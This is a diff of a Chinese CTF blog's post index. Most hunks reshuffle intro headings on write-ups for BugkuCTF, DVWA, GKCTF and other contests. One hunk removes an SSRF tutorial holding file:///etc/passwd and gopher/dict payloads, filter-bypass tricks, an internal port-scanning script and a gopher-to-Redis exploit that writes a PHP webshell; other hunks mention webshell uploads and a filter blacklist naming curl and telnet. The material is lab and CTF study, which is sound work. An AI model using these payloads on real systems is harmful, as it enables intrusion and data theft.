@@ -3,7 +3,8 @@
   <entry>
     <title>羊城杯 2020</title>
     <url>/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
-    <content><![CDATA[<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>连接上蚁剑后，发现<code>bbbbbbbbb.txt</code>文件，base64解码保存为图片即可看到flag。<a id="more"></a></p>
+    <content><![CDATA[<p>记录一下wp<a id="more"></a></p>
+<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>连接上蚁剑后，发现<code>bbbbbbbbb.txt</code>文件，base64解码保存为图片即可看到flag。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">r&#x27;bbbbbbbbb.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f2 = open(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">flag = (base64.b64decode(s))</span><br><span class="line">f2.write(flag)</span><br><span class="line">f2.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 
 <h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><p>源码在</p>
@@ -92,7 +93,7 @@
   <entry>
     <title>BugkuCTF-WEB</title>
     <url>/2020/03/26/BugkuCTF-WEB/</url>
-    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>最近把bugku的基础web题都刷完了。里面有大概10道题都不能访问。这里记录一下解题的过程。<a id="more"></a></p>
+    <content><![CDATA[<p>最近把bugku的基础web题都刷完了。里面有大概10道题都不能访问。这里记录一下解题的过程。<a id="more"></a></p>
 <h5 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a><strong>备份是个好习惯</strong></h5><p>题目提示：听说备份是个好习惯。</p>
 <p>于是试着加入后缀<strong>index.php.bak</strong>，然后看到提示下载。然后打开下载的备份文件看到：</p>
 <img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322105903654.png" alt="image-20200322105903654" style="high:80%;width:80%;" />
@@ -287,7 +288,7 @@
   <entry>
     <title>腾讯T-Star高校挑战赛 2020</title>
     <url>/2020/07/02/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Gq和hhhm师傅tql<a id="more"></a></p>
+    <content><![CDATA[<p>Gq和hhhm师傅tql<a id="more"></a></p>
 <h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>考点：前端js验证图片后缀</p>
 <p>上传jpg图片后改php后缀forword，内容是一句话木马</p>
 <p>在key目录下有key{K735c9f0D7ddc3b9}</p>
@@ -368,7 +369,7 @@
   <entry>
     <title>DVWA练习Ⅰ</title>
     <url>/2020/03/14/DVWA%E7%BB%83%E4%B9%A0%E2%85%A0/</url>
-    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>DVWA是一款开源的渗透测试漏洞练习平台,分别有不同的练习板块，如暴力破解，CSRF，文件包含和上传漏洞，以及SQL注入漏洞，XSS等等。还分别有低中高难度可以选择。<a id="more"></a></p>
+    <content><![CDATA[<p>DVWA是一款开源的渗透测试漏洞练习平台,分别有不同的练习板块，如暴力破解，CSRF，文件包含和上传漏洞，以及SQL注入漏洞，XSS等等。还分别有低中高难度可以选择。<a id="more"></a></p>
 <h5 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a><strong>暴力破解</strong></h5><h6 id="low等级"><a href="#low等级" class="headerlink" title="low等级"></a>low等级</h6><p>界面如下，是一个输入用户名和密码的文本框</p>
 <img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314104652827.png" alt="image-20200314104652827" style="high:80%;width:80%;" />
 
@@ -552,8 +553,9 @@
   <entry>
     <title>DVWA练习Ⅱ</title>
     <url>/2020/03/15/DVWA%E7%BB%83%E4%B9%A0%E2%85%A1/</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a><strong>文件上传</strong></h1><ul>
-<li><strong>文件上传漏洞</strong><a id="more"></a></li>
+    <content><![CDATA[<p>DVWA练习第二弹<a id="more"></a></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a><strong>文件上传</strong></h1><ul>
+<li><strong>文件上传漏洞</strong></li>
 </ul>
 <p>通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限</p>
 <ul>
@@ -676,7 +678,7 @@
   <entry>
     <title>DelCTF 2020</title>
     <url>/2020/05/08/DelCTF2020/</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>题目对我来说太难，只复现了两道题目。<a id="more"></a></p>
+    <content><![CDATA[<p>题目对我来说太难，只复现了两道题目。<a id="more"></a></p>
 <h4 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a><strong>Check In</strong></h4><p>一道上传漏洞题，会检查<code>Content-Type</code>和文件后缀黑名单，这个问题不大。</p>
 <p>然后发现过滤文件内容黑名单：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet</span><br></pre></td></tr></table></figure>
@@ -757,7 +759,7 @@
   <entry>
     <title>DozerCTF 2020</title>
     <url>/2020/06/17/DozerCTF/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>干啥啥不行，赛后read writeup第一名。<a id="more"></a></p>
+    <content><![CDATA[<p>干啥啥不行，赛后read writeup第一名。<a id="more"></a></p>
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>这道题是原题</p>
 <p>首先提示url二次编码</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%25%32%37</span><br></pre></td></tr></table></figure>
@@ -908,7 +910,7 @@
   <entry>
     <title>GKCTF 2020</title>
     <url>/2020/06/01/GKCTF%202020/</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>抽空复现一下<a id="more"></a></p>
+    <content><![CDATA[<p>抽空复现一下<a id="more"></a></p>
 <h4 id="老八小超市"><a href="#老八小超市" class="headerlink" title="老八小超市"></a><strong>老八小超市</strong></h4><p>打开之后是个shopxo的商城，用默认后台账号密码登录，成功进入后台。</p>
 <p>下载免费的主题，把一句话木马放进去。</p>
 <p>安装主题，即可getshell</p>
@@ -1020,7 +1022,7 @@
   <entry>
     <title>NodeJs学习</title>
     <url>/2020/07/20/NodeJs%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>学习一波NodeJs<a id="more"></a></p>
+    <content><![CDATA[<p>学习一波NodeJs<a id="more"></a></p>
 <h1 id="原型"><a href="#原型" class="headerlink" title="原型"></a><strong>原型</strong></h1><p>首先要搞清楚<code>prototype</code>，<code>__proto__</code>，<code>constructor</code>这三个东西。</p>
 <p>在JS中，声明一个函数Foo的同时，浏览器会在内存中创建一个对象，然后Foo函数默认有一个属性<code>prototype</code>指向了这个对象，这个对象就是函数Foo的<strong>原型对象</strong>，简称为函数的原型。这个对象默认会有个属性<code>constructor</code>指向了这个函数Foo。</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype.constructor)<span class="comment">//[Function: Foo]</span></span><br></pre></td></tr></table></figure>
@@ -1171,158 +1173,9 @@
       </categories>
   </entry>
   <entry>
-    <title>SSRF漏洞学习</title>
-    <url>/2020/07/14/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>总结的不是很全，以后慢慢更。<a id="more"></a></p>
-<h1 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么"></a><strong>ssrf是什么</strong></h1><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p>
-<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
-<p>比如有个URL是这样的：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>
-
-<p>这个URL原本是服务端发起请求获取链接地址的图片数据。</p>
-<p>但是如果存在SSRF漏洞的话，我们就可以使用一些协议来读取和执行相关命令，例如：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://127.0.0.1:22</span><br><span class="line">http://www.xxx.com/image.php?image=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/image.php?image=dict://127.0.0.1:22/</span><br><span class="line">http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test</span><br></pre></td></tr></table></figure>
-
-<p>那么问题来了，如何判断是否存在SSRF漏洞呢？</p>
-<p>通常来说会出现SSRF的地方比如上面说的URL地址加载或下载图片</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>
-
-<p>还有就是图片、文章收藏功能</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/fhaljs</span><br></pre></td></tr></table></figure>
-
-<p>以及通过URL分享，转码服务，在线翻译，未公开的api实现以及其他扩展调用URL的功能等等一些地方。我们也可以通过一些url中的关键字来识别，比如</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">share、wap、url、link、src、source、target、u、<span class="number">3</span>g、display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>
-
-<h1 id="ssrf小试验"><a href="#ssrf小试验" class="headerlink" title="ssrf小试验"></a>ssrf小试验</h1><p>首先要知道可能出现SSRF的函数有：<code>file_get_contents()</code>、<code>curl()</code>、<code>fsocksopen()</code>、<code>fopen()</code>等，这里用<code>curl()</code>来举例子。</p>
-<p>存在SSRF漏洞的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//创建一个新的curl资源</span></span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  <span class="comment">//设置URL和相应的选项</span></span><br><span class="line">  curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">  curl_setopt($ch,CURLOPT_HEADER,<span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//抓取URL并把它传递给浏览器</span></span><br><span class="line">  curl_exec($ch);</span><br><span class="line">  <span class="comment">//关闭curl资源，并且释放系统资源</span></span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>http协议</li>
-</ul>
-<p>探测内网主机存活</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=http://127.0.0.1:1314</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>通过file协议读取文件</li>
-</ul>
-<p>在有回显的情况下，利用 file 协议可以读取任意内容</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#win</span></span><br><span class="line">http://127.0.0.1/ssrf.php?url=file:///C:/WINDOWS/win.ini</span><br><span class="line"><span class="comment">#liunx</span></span><br><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>dict协议</li>
-</ul>
-<p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:6379/info</span><br></pre></td></tr></table></figure>
-
-<p>查看redis的相关配置。</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:22/info</span><br></pre></td></tr></table></figure>
-
-<p>查看ssh的banner信息</p>
-<ul>
-<li>gopher协议</li>
-</ul>
-<p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求，gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)，可用于反弹shell。</p>
-<p>这里使用的是阿里云服务器，先开启一个监听</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br></pre></td></tr></table></figure>
-
-<p>然后访问</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=gopher://127.0.0.1:8102/_test</span><br></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br><span class="line">connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="keyword">from</span> localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">52450</span></span><br><span class="line">test</span><br></pre></td></tr></table></figure>
-
-<h1 id="ssrf怎么绕"><a href="#ssrf怎么绕" class="headerlink" title="ssrf怎么绕"></a><strong>ssrf怎么绕</strong></h1><p>这里总结了一些比较常用的绕过方法。</p>
-<ul>
-<li>data伪协议绕过</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>    </span><br><span class="line"> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|\/\/|sftp|ldap|gopher|http|https/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$a = file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">eval</span>($a); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data:text/plain;base64,cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>IP限制绕过</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">115.239</span><span class="number">.210</span><span class="number">.26</span>  &gt;&gt;&gt;  <span class="number">16373751032</span></span><br><span class="line">首先把这四段数字给分别转成<span class="number">16</span>进制，结果：<span class="number">73</span> ef d2 <span class="number">1</span>a</span><br><span class="line">然后把 <span class="number">73</span>efd21a 这十六进制一起转换成<span class="number">8</span>进制</span><br><span class="line">记得访问的时候加<span class="number">0</span>表示使用八进制(可以是一个<span class="number">0</span>也可以是多个<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  &gt;&gt;&gt;  http://<span class="number">2130706433</span>/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>解析url的绕过</li>
-</ul>
-<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<code>www.baidu.com</code>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<code>www.baidu.com</code>，而实际上这个URL所请求的内容都是127.0.0.1上的内容。</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>
-
-<p>这里要注意的是在对@解析域名中，不同的处理函数存在处理差异，例如： <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>，在PHP的parse_url中会识别<code>www.ccc.com</code>，而libcurl则识别为<code>www.bbb.com</code>。</p>
-<ul>
-<li>定制DNS服务</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://xip.io/</span><br><span class="line">http://nip.io/</span><br><span class="line">https://ip6.name/</span><br><span class="line">https://sslip.io/</span><br></pre></td></tr></table></figure>
-
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io/</span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>封闭式数字字母</li>
-</ul>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>短地址绕过</li>
-</ul>
-<p>通过短地址的方式来绕过，短地址生成网站：<a href="https://tinyurl.com/">https://tinyurl.com/</a></p>
-<h1 id="ssrf怎么防"><a href="#ssrf怎么防" class="headerlink" title="ssrf怎么防"></a><strong>ssrf怎么防</strong></h1><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于 <code>file://</code>, <code>gopher://</code>, <code>ftp://</code> 等引起的问题。</p>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a><strong>例题</strong></h1><p>这些题目都是以前复现的题目，当时看的云里雾里，现在回头来看又加深了理解。</p>
-<h2 id="SSRF的PHP黑魔法"><a href="#SSRF的PHP黑魔法" class="headerlink" title="SSRF的PHP黑魔法"></a><strong>SSRF的PHP黑魔法</strong></h2><p>这是hhhm师傅出的题目三座大山</p>
-<p>做这道题目之前先来了解一下SSRF的PHP黑魔法，<code>file_get_contents()</code>函数如果输入一个不存在的协议名，会爆出一个warning，然后导致目录穿越，从而实现SSRF攻击，比如我们请求一个PHP无法识别的协议，比如<code>abc://</code>，那么他就会就被PHP识别为了一个目录，如果要读取同目录下的index.php，就要用<code>abc://../injiahsdex.php</code>来进行读取。这样做的目的就是可以在SSRF的众多协议被ban的情况下来进行读取文件。</p>
-<p>回到题目，首先按照示例输入one，输出一张风景画，依照提示可知输入two，three同理会有图片，fuzz一下发现有提示：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">can you pass it and then read index.php? </span><br></pre></td></tr></table></figure>
-
-<p>读文件的话一般是ssrf，从fuzz的结果会发现输入协议相关的内容就会被过滤掉，其中过滤了如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:</span><br></pre></td></tr></table></figure>
-
-<p>这时候利用php的黑魔法<code>abc://../index.php</code>就可以读取本地的index.php。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$name = $_GET[<span class="string">&quot;num&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($name))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($name===<span class="string">&quot;one&quot;</span>||$name===<span class="string">&quot;two&quot;</span>||$name===<span class="string">&quot;three&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = <span class="string">&quot;tour/<span class="subst">$name</span>.php&quot;</span>;</span><br><span class="line">         <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:|input|filter|flag/i&#x27;</span>,$name))</span><br><span class="line">          &#123;</span><br><span class="line">            $url=file_get_contents($name);</span><br><span class="line">            <span class="keyword">echo</span>($url);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;can you pass it and then read index.php? &quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#&lt;!---next c2Vzcw==.php--&gt; </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这道题目后面还有一部分无参数，不涉及SSRF这里就不提了。</p>
-<h2 id="Redis-SSRF-getshell"><a href="#Redis-SSRF-getshell" class="headerlink" title="Redis SSRF getshell"></a><strong>Redis SSRF getshell</strong></h2><p>buu题目EZ三剑客-EzWeb，首先得到的页面是一个输入框</p>
-<p>当我们输入<code>file:///etc/passwd</code>的时候，下方提示别这样，应该是过滤了file协议，这里可以使用<code>file:&lt;空格&gt;///</code>绕过，成功回显，基本上可以确定有SSRF漏洞了。然后我们再使用file协议读取源码试一下，在输入框输入<code>file: ///var/www/html/index.php</code>，成功获取源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到经过了一个正则的匹配才可以<code>curl($url);</code>。</p>
-<p>从正则可以看出过滤了<code>file://</code>，<code>dict</code>，<code>127.0.0.1</code>，<code>localhost</code>，<code>../</code>但是没有过滤http协议和gopher协议。看到如果get传值secret会执行ifconfig。</p>
-<p>按F12在有个注释也可以发现?secret，访问?secret得到本机ip</p>
-<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114207278.png" style="high:80%;width:80%;" />
-
-<p>写个脚本探测内网</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>
-
-<p>跑出结果4 5 6 7 10 11，一个一个试，11的时候给出了提示，当然这里不用写脚本，用burp去爆破也是可以的。</p>
-<p>获取到地址之后，然后用burp爆破端口。</p>
-<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114920600.png" style="high:80%;width:80%;" />
-
-<p>payloads选numbers爆破1到65535端口，线程选1。一般来说猜测是6379端口（redis）或3306端口（mysql），当然爆破出结果是6374。</p>
-<p>因为输入url这里只限制了<code>file://</code>，没有ban掉<code>gopher://</code>，很容易想到是Redis SSRF getshell。</p>
-<p>这里直接用别人写好的exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>
-
-<p>payload为：</p>
